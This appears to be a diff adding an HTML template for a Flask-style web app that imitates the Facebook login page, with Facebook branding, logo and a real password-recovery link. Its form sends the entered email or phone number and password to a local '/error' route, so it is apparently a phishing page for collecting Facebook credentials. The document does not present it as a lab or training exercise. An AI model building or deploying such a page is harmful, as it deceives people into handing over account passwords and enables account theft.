@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Facebook Login</title>
+
+    <link rel="icon" href="{{ url_for('static', filename='icon.png') }}" type="image/x-icon">
+
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+        }
+
+        .header {
+            background-color: #4267B2;
+            height: 95px;
+            position: relative;
+            bottom: 15px;
+            width: 100%;
+            margin: 0;
+            padding: 0;
+        }
+
+        .logo {
+            background-image: url("{{ url_for('static', filename='fblogo.png') }}");
+            width: 170px;
+            height: 38px;
+            left: 100px;
+            position: relative;
+            top: 35px;
+
+
+        }
+
+        .container {
+            background-color: #e9ebee;
+            height: 450px;
+            margin: 0;
+            padding: 0;
+
+        }
+
+        .login-form {
+            background-color: #ffffff;
+            position: relative;
+            margin: 0 auto;
+            top: 80px;
+            height: 300px;
+            width: 580px;
+            border-radius: 5px;
+        }
+
+        .login-text,
+        .login-form {
+            font-family: Arial, Helvetica, sans-serif;
+            display: table;
+            position: relative;
+            margin: 0 auto;
+            top: 50px;
+            font-size: 18px;
+
+        }
+
+        .login {
+            position: relative;
+            top: 70px;
+            display: table;
+            margin: 0 auto;
+        }
+
+        .input {
+            width: 300px;
+            height: 30px;
+            margin-top: 10px;
+            border-radius: 3px;
+            border: 1px solid #ccd0d5;
+            padding: 3px;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        #submit {
+            background-color: #4267B2;
+            color: white;
+            height: 45px;
+            width: 309px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .forgot {
+            font-size: 12px;
+            position: relative;
+            top: 15px;
+            text-align: center;
+            display: table;
+            margin: 0 auto;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="header">
+        <div class="logo">
+
+        </div>
+    </div>
+    <div class="container">
+        <div class="login-form">
+            <span class="login-text">
+                Log in to Facebook
+            </span>
+            <div class="login">
+                <form action="/error" method="post">
+                    <span><input class="input" id="email" name="email" type="text"
+                            placeholder="Email address or phone number" autocomplete="username" required></span>
+                    <br />
+                    <span><input class="input" id="password" type="password" name="password" placeholder="Password"
+                            autocomplete="off" required></span>
+                    <br />
+                    <span><input id="submit" type="submit" class="input" value="Log In"></span>
+                    <br />
+                    <span class="forgot"><a
+                            href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login">Forgotten
+                            password?</a></span>
+                </form>
+            </div>
+
+
+        </div>
+
+    </div>
+</body>
+
+</html>
